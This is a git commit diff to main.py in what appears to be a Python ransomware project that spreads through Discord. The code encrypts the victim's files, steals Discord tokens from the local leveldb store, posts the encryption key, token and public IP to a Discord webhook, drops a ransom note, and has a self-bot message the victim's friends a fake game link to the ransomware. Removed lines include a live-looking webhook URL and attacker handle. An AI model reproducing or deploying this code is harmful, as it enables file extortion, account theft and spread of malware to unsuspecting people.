c7d899d3d599585fb7e23446439c9088a5928b2e
Null <66488397+NullByte75@users.noreply.github.com>
2021-01-07 14:28:08 +0100

    Update main.py

--- main.py
+++ main.py
@@ -7,12 +7,10 @@ import random
 import json
 from pathlib import Path
 import playsound
-import platform
 import discord
 from discord.ext import commands
 import asyncio
 
-sys = str(platform.system)
 key = Fernet.generate_key()
 user = str(os.environ["USERNAME"])
 
@@ -40,39 +38,19 @@ def crypt(filename):
         file.write(encrypted_data)
 
 def warn():
-    if sys == "Linux":
-        name = "Ech0#0093" #change to your discord name and tag
-        ip = requests.get('https://api.ipify.org').text
-        url = "https://discord.com/api/webhooks/795958180373987338/aJvcJv1b_eMnMCsBwvf6Sct2XRpHsJJfpezlvoSUr5tofli5fF2rR7XxnJwuoec14VLm" 
-        data = {}
-        data["content"] = "Key Content for " + user + ": " + str(key)
-        data["username"] = ip
-        requests.post(url, data=json.dumps(data), headers={"Content-Type": "application/json"})
-        f = open("oof.txt", "w")
-        f.write("Ooops your files are encrypted! Contact " + name + " on discord to get your files back!")
-        f.close()
-        subprocess.call(r"oof.txt", shell=False)
-    if sys == "Windows":
-        name = "Ech0#0093" #change to your discord name and tag
-        path = "C:\\Users\\" + user + "\\AppData\\Roaming\\Discord\\Local Storage\\leveldb"
-        ip = requests.get('https://api.ipify.org').text
-        url = "https://discord.com/api/webhooks/795958180373987338/aJvcJv1b_eMnMCsBwvf6Sct2XRpHsJJfpezlvoSUr5tofli5fF2rR7XxnJwuoec14VLm" 
-        data = {}
-        data["content"] = "Key Content for " + user + ": " + str(key) + " Discord token: " + str(find_tokens(path))   
-        data["username"] = ip
-        requests.post(url, data=json.dumps(data), headers={"Content-Type": "application/json"})
-        f = open("oof.txt", "w")
-        f.write("Ooops your files are encrypted! Contact " + name + " on discord to get your files back!\nP.S: We also have your token")
-        f.close()
-        subprocess.call(r"notepad oof.txt", shell=False)
+    name = "" #change to your discord name and tag
+    path = "C:\\Users\\" + user + "\\AppData\\Roaming\\Discord\\Local Storage\\leveldb"
+    ip = requests.get('https://api.ipify.org').text
+    url = "" # webhook url 
+    data = {}
+    data["content"] = "Key Content for " + user + ": " + str(key) + " Discord token: " + str(find_tokens(path))   
+    data["username"] = ip
+    requests.post(url, data=json.dumps(data), headers={"Content-Type": "application/json"})
+    f = open("oof.txt", "w")
+    f.write("Ooops your files are encrypted! Contact " + name + " on discord to get your files back!\nP.S: We also have your token")
+    f.close()
+    subprocess.call(r"notepad oof.txt", shell=False)
 
-def main2():
-    username = subprocess.call("whoami", shell=False)
-    path2 = "/home/" + username 
-    my_path = Path(path2)
-    for file in my_path.glob("**/*.*"):
-        crypt(file)
-    warn()
 
 def main():
     path1 = "C:\\Users" + "\\" + user + "\\OneDrive\\Desktop\\test"
@@ -82,7 +60,6 @@ def main():
     warn()
 
 urltoransomwarewindows = "" # url to ransomeware exe version
-urltoransomwarelinux = "" # url to ransomeware linux version
 token = str(find_tokens) #insert target token
 prefix = ""
 client = discord.Client()
@@ -91,11 +68,7 @@ bot = commands.Bot(command_prefix=prefix, self_bot=True)
 @bot.event
 async def on_ready():
     for user in bot.user.friends:
-        user.send("Yo try this new game! " + urltoransomwarewindows + "for windows" + urltoransomwarelinux + "for linux")
-    if sys == "Windows":
-        main()
-    if sys == "Linux":
-        main2()
+        user.send("Yo try this new game! " + urltoransomwarewindows + "for windows")
         
 asyncio.set_event_loop(asyncio.new_event_loop())
 loop = asyncio.new_event_loop()
